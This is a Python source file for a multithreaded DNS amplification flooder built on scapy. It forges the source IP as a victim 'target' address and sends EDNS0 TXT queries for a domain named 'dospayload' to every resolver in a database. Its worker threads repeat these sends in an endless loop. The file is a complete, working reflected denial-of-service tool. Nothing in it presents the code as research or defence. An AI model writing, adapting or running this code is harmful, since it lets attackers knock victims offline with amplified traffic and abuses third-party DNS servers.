import threading
import time
from typing import List
from scapy.volatile import RandShort
from scapy.sendrecv import send
from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNS, DNSQR, DNSRROPT

from DataBaseOperator import DNSDatabaseManager


class DNSFlooder:
    def __init__(self, database_manager: DNSDatabaseManager):
        """
        Initialize DNS Flooder with a Database Manager
        
        :param database_manager: Instance of DNSDatabaseManager
        """
        self.db_manager = database_manager

    def send_packet(self, target: str, dns: str):
        """
        Send a DNS packet to a specific DNS server
        
        :param target: Source IP address
        :param dns: Destination DNS server IP
        """
        full_dns = "dospayload.chickenkiller.com"
        packet = (
            IP(src=target, dst=dns) /
            UDP(sport=RandShort(), dport=53) /
            DNS(
                id=0xdead,
                qr=0,  # Query (0) or Response (1)
                opcode=0,  # Standard query
                rd=1,  # Recursion desired
                ad=1,  # Authentic data
                tc=0,  # cannot set in query but we expect the response is not truncated
                qd=DNSQR(qname=full_dns, qtype=16),  # 16 means TXT
                ar=DNSRROPT(
                    rclass=4096,  # maximum is 4096
                    version=0,
                    z=0x0000,
                    extrcode=00,  # Higher bits in extended RCODE
                    rdata=[b'\x00\x0a\x00\x08\x31\xb4\x09\x09\x4b\xb5\xaf\x56']  # cookie part, copy from dig response resolved by Wireshark
            )
)
        )

        send(packet, verbose=False, realtime=False)
        # send(packet, loop=1, verbose=False, inter=0.1, realtime=False)

    def attack(self, target: str, batch_size: int = 500):
        """
        Flood DNS servers with DNS packets
        
        :param target: Source IP address
        """
        self.flood_dns_servers(target, batch_size)

    def flood_dns_servers(self, target: str, batch_size: int = 500):
        """
        Flood DNS servers in batches
        
        :param target: Source IP address
        :param batch_size: Number of DNS servers per thread
        """
        dns_servers = self.db_manager.get_all_dns_servers()
        
        threads = []
        for i in range(0, len(dns_servers), batch_size):
            dns_batch = dns_servers[i:i+batch_size]
            
            thread = threading.Thread(
                target=self._process_dns_batch,
                args=(target, dns_batch),
                name=f"DNSThread-{i//batch_size + 1}"
            )
            thread.start()
            threads.append(thread)
        
        for thread in threads:
            thread.join()

    def _process_dns_batch(self, target: str, dns_batch: List[str]):
        """
        Process a batch of DNS servers in a single thread
        
        :param target: Source IP address
        :param dns_batch: List of DNS server IPs to process
        """
        thread_name = threading.current_thread().name
        print(f"{thread_name} processing {len(dns_batch)} DNS servers")
        
        while True:
            for dns in dns_batch:
                try:
                    self.send_packet(target, dns)
                except Exception as e:
                    print(f"Error processing DNS {dns}: {e}")

            time.sleep(0.1)
